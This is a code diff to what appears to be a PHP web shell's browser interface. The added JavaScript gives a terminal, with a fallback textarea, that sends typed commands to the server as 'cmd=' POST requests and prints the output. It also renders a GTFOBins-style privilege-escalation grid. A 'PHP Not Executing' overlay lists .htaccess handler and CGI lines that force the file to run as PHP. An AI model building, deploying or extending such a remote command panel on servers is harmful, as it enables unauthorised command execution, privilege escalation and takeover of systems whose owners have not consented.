+        write: function(s) { fbTerm.value += s.replace(/\x1b\[[0-9;]*m/g,''); fbTerm.scrollTop = fbTerm.scrollHeight; },
+        writeln: function(s) { this.write(s + '\n'); },
+        clear: function() { fbTerm.value = ''; }
+    };
+    fit = { fit: function(){} };
+    fbInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var cmd = fbInput.value.trim();
+            fbInput.value = '';
+            if (!cmd) { fbTerm.value += '\n' + getPrompt(); return; }
+            cmdHistory.push(cmd); historyIdx = cmdHistory.length;
+            fbTerm.value += cmd + '\n';
+            if (cmd === 'clear') { fbTerm.value = getPrompt(); return; }
+            fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(cmd) })
+            .then(function(r){return r.text()}).then(function(out) {
+                if (out.indexOf('__CWD__:') === 0) { CWD = out.replace('__CWD__:','').trim(); }
+                else { fbTerm.value += out + '\n'; }
+                fbTerm.value += getPrompt();
+                fbTerm.scrollTop = fbTerm.scrollHeight;
+            });
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (historyIdx > 0) { historyIdx--; fbInput.value = cmdHistory[historyIdx]; }
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (historyIdx < cmdHistory.length - 1) { historyIdx++; fbInput.value = cmdHistory[historyIdx]; }
+            else { fbInput.value = ''; historyIdx = cmdHistory.length; }
+        }
+    });
+}
+
+function eraseLine() { if (XTERM_AVAILABLE) { for (var i = 0; i < currentLine.length; i++) term.write('\b \b'); } }
+function termClear() { term.clear(); if (XTERM_AVAILABLE) term.write(getPrompt()); else $('fallback-term').value = getPrompt(); currentLine = ''; }
 function termExec(cmd) {
     switchPanel('terminal');
-    currentLine = cmd; term.write(cmd);
-    term.onData('\r');
+    if (XTERM_AVAILABLE) {
+        currentLine = cmd; term.write(cmd);
+    }
     fetch(window.location.href, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(cmd)})
-    .then(r=>r.text()).then(out => {
-        if (out.startsWith('__CWD__:')) CWD = out.replace('__CWD__:','').trim();
+    .then(function(r){return r.text()}).then(function(out) {
+        if (out.indexOf('__CWD__:') === 0) CWD = out.replace('__CWD__:','').trim();
         else term.write('\r\n' + out);
-        term.write(getPrompt());
+        if (XTERM_AVAILABLE) term.write(getPrompt());
+        else { $('fallback-term').value += getPrompt(); $('fallback-term').scrollTop = $('fallback-term').scrollHeight; }
     });
     currentLine = '';
 }
@@ -1291,6 +1456,12 @@ function updateClock() {
 }
 updateClock(); setInterval(updateClock, 1000);
 
+// Environment capabilities: update terminal mode indicator
+(function() {
+    var el = $('env-terminal-mode');
+    if (el) el.textContent = XTERM_AVAILABLE ? 'xterm.js (full)' : 'Fallback (no CDN)';
+})();
+
 // Update topbar path when CWD changes
 const origGetPrompt = getPrompt;
 const _origCWD = Object.getOwnPropertyDescriptor(window, 'CWD') || {};
@@ -1315,6 +1486,10 @@ function addGtfoDataAttrs() {
 const _origRenderGtfo = renderGtfoGrid;
 renderGtfoGrid = function() { _origRenderGtfo(); addGtfoDataAttrs(); };
 renderGtfoGrid();
+
+// Update environment info card
+var envTermEl = $('env-terminal-mode');
+if (envTermEl) envTermEl.textContent = XTERM_AVAILABLE ? 'xterm.js (CDN loaded)' : 'Fallback textarea (no CDN)';
 </script>
 
 <!-- PHP detection for main app -->
@@ -1323,7 +1498,7 @@ renderGtfoGrid();
 (function(){
     var c = document.getElementById('php-check-main');
     if (!c || c.textContent.trim() !== 'PHP_OK') {
-        document.body.innerHTML = '<div style="position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:99999"><div style="background:#161b22;border:1px solid rgba(248,81,73,0.3);border-radius:16px;padding:32px;max-width:480px;text-align:center"><h2 style="color:#f85149;margin-bottom:12px">PHP Not Executing</h2><p style="color:#8b949e;font-size:14px;margin-bottom:16px">This file is being served as plain text. PHP is not processing it.</p><button onclick="fetch(location.href,{method:\'POST\',headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'},body:\'action=fix_htaccess&mode=module\'}).then(r=>r.json()).then(d=>{if(d.ok)location.reload();else alert(\'Failed\')}).catch(()=>alert(\'Cannot fix\'))" style="padding:10px 24px;background:#007AFF;color:#fff;border:none;border-radius:10px;font-size:14px;cursor:pointer">Create .htaccess Fix</button></div></div>';
+        document.body.innerHTML = '<div style="position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:99999"><div style="background:#161b22;border:1px solid rgba(248,81,73,0.3);border-radius:16px;padding:32px;max-width:520px;text-align:center"><h2 style="color:#f85149;margin-bottom:12px">PHP Not Executing</h2><p style="color:#8b949e;font-size:14px;margin-bottom:16px">This file is being served as plain text. PHP is not processing it.</p><p style="color:#d29922;font-size:13px;margin-bottom:12px;font-weight:600">Create a .htaccess file in the same directory with:</p><code style="display:block;background:#0d1117;padding:12px;margin:8px 0;border-radius:8px;font-size:12px;text-align:left;color:#e6edf3;white-space:pre;overflow-x:auto">AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .phtml\n&lt;FilesMatch "\\.php$"&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code><p style="color:#8b949e;font-size:12px;margin-top:8px">If that doesn\'t work, try CGI mode:</p><code style="display:block;background:#0d1117;padding:8px;margin:4px 0;border-radius:6px;font-size:12px;text-align:left;color:#e6edf3">Options +ExecCGI\nAddHandler cgi-script .php</code></div></div>';
     }
 })();
 </script>
